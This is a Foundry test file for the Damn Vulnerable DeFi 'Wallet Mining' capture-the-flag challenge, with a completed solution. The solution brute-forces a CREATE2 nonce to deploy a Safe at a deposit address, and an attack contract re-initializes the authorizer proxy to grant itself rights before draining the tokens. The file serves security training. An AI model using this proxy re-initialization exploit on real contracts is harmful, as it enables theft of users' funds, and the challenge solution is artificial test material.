// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SafeProxyFactory, SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {Create2} from "@openzeppelin/contracts/utils/Create2.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {
    AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";

contract WalletMiningChallenge is Test {
    address deployer = makeAddr("deployer");
    address upgrader = makeAddr("upgrader");
    address ward = makeAddr("ward");
    address player = makeAddr("player");
    address user;
    uint256 userPrivateKey;

    address constant USER_DEPOSIT_ADDRESS = 0x8be6a88D3871f793aD5D5e24eF39e1bf5be31d2b;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    address constant SAFE_SINGLETON_FACTORY_ADDRESS = 0x914d7Fec6aaC8cd542e72Bca78B30650d45643d7;
    bytes constant SAFE_SINGLETON_FACTORY_CODE =
        hex"7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe03601600081602082378035828234f58015156039578182fd5b8082525050506014600cf3";

    DamnValuableToken token;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    SafeProxyFactory proxyFactory;
    Safe singletonCopy;

    uint256 initialWalletDeployerTokenBalance;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Player should be able to use the user's private key
        (user, userPrivateKey) = makeAddrAndKey("user");

        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy authorizer with a ward authorized to deploy at DEPOSIT_ADDRESS
        address[] memory wards = new address[](1);
        wards[0] = ward;
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;
        AuthorizerFactory authorizerFactory = new AuthorizerFactory();
        authorizer = AuthorizerUpgradeable(authorizerFactory.deployWithProxy(wards, aims, upgrader));

        // Send big bag full of DVT tokens to the deposit address
        token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Include Safe singleton factory in this chain
        vm.etch(SAFE_SINGLETON_FACTORY_ADDRESS, SAFE_SINGLETON_FACTORY_CODE);

        // Call singleton factory to deploy copy and factory contracts
        (bool success, bytes memory returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(Safe).creationCode));
        singletonCopy = Safe(payable(address(uint160(bytes20(returndata)))));

        (success, returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(SafeProxyFactory).creationCode));
        proxyFactory = SafeProxyFactory(address(uint160(bytes20(returndata))));

        // Deploy wallet deployer
        walletDeployer = new WalletDeployer(address(token), address(proxyFactory), address(singletonCopy));

        // Set authorizer in wallet deployer
        walletDeployer.rule(address(authorizer));

        // Fund wallet deployer with tokens
        initialWalletDeployerTokenBalance = walletDeployer.pay();
        token.transfer(address(walletDeployer), initialWalletDeployerTokenBalance);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Check initialization of authorizer
        assertNotEq(address(authorizer), address(0));
        assertEq(TransparentProxy(payable(address(authorizer))).upgrader(), upgrader);
        assertTrue(authorizer.can(ward, USER_DEPOSIT_ADDRESS));
        assertFalse(authorizer.can(player, USER_DEPOSIT_ADDRESS));

        // Check initialization of wallet deployer
        assertEq(walletDeployer.chief(), deployer);
        assertEq(walletDeployer.gem(), address(token));
        assertEq(walletDeployer.mom(), address(authorizer));

        // Ensure DEPOSIT_ADDRESS starts empty
        assertEq(USER_DEPOSIT_ADDRESS.code, hex"");

        // Factory and copy are deployed correctly
        assertEq(address(walletDeployer.cook()).code, type(SafeProxyFactory).runtimeCode, "bad cook code");
        assertEq(walletDeployer.cpy().code, type(Safe).runtimeCode, "no copy code");

        // Ensure initial token balances are set correctly
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertGt(initialWalletDeployerTokenBalance, 0);
        assertEq(token.balanceOf(address(walletDeployer)), initialWalletDeployerTokenBalance);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_walletMining() public checkSolvedByPlayer {
        address[] memory owners = new address[](1);
        owners[0] = user;
        bytes memory initializer = abi.encodeWithSelector(
            Safe.setup.selector, owners, 1, address(0), "", address(0), address(0), 0, address(0)
        );

        uint256 nonce;

        for (uint256 i = 0; i < 100; i++) {
            bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), i));
            bytes memory deploymentData =
                abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy))));

            bytes32 finalHash =
                keccak256(abi.encodePacked(bytes1(0xff), address(proxyFactory), salt, keccak256(deploymentData)));
            address expectedAddress = address(uint160(uint256(finalHash)));

            if (expectedAddress == USER_DEPOSIT_ADDRESS) {
                nonce = i;
                break;
            }
        }

        bytes32 safeTxHash = keccak256(
            abi.encode(
                0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8,
                address(token),
                0,
                keccak256(abi.encodeWithSignature("transfer(address,uint256)", user, DEPOSIT_TOKEN_AMOUNT)),
                Enum.Operation.Call,
                10000,
                21000,
                tx.gasprice,
                address(0),
                address(0),
                0
            )
        );

        bytes32 domainSeparator = keccak256(
            abi.encode(
                0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218, block.chainid, USER_DEPOSIT_ADDRESS
            )
        );

        bytes memory txHashData = abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator, safeTxHash);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, keccak256(txHashData));
        bytes memory signature = abi.encodePacked(r, s, v);

        bytes memory execTransactionData = abi.encodeWithSelector(
            Safe.execTransaction.selector,
            address(token),
            0,
            abi.encodeWithSignature("transfer(address,uint256)", user, DEPOSIT_TOKEN_AMOUNT),
            Enum.Operation.Call,
            10000,
            21000,
            tx.gasprice,
            address(0),
            address(0),
            signature
        );

        new AttackWalletMining(
            authorizer,
            walletDeployer,
            USER_DEPOSIT_ADDRESS,
            initializer,
            nonce,
            token,
            execTransactionData,
            address(ward)
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Factory account must have code
        assertNotEq(address(walletDeployer.cook()).code.length, 0, "No code at factory address");

        // Safe copy account must have code
        assertNotEq(walletDeployer.cpy().code.length, 0, "No code at copy address");

        // Deposit account must have code
        assertNotEq(USER_DEPOSIT_ADDRESS.code.length, 0, "No code at user's deposit address");

        // The deposit address and the wallet deployer must not hold tokens
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), 0, "User's deposit address still has tokens");
        assertEq(token.balanceOf(address(walletDeployer)), 0, "Wallet deployer contract still has tokens");

        // User account didn't execute any transactions
        assertEq(vm.getNonce(user), 0, "User executed a tx");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // Player recovered all tokens for the user
        assertEq(token.balanceOf(user), DEPOSIT_TOKEN_AMOUNT, "Not enough tokens in user's account");

        // Player sent payment to ward
        assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
    }
}

contract AttackWalletMining {
    constructor(
        AuthorizerUpgradeable authorizer,
        WalletDeployer walletDeployer,
        address USER_DEPOSIT_ADDRESS,
        bytes memory initializer,
        uint256 nonce,
        DamnValuableToken token,
        bytes memory execTransactionData,
        address ward
    ) {
        address[] memory wards = new address[](1);
        address[] memory aims = new address[](1);
        wards[0] = address(this);
        aims[0] = USER_DEPOSIT_ADDRESS;

        authorizer.init(wards, aims);
        walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, nonce);

        token.transfer(ward, token.balanceOf(address(this)));

        (bool s,) = USER_DEPOSIT_ADDRESS.call(execTransactionData);
        require(s);
    }
}
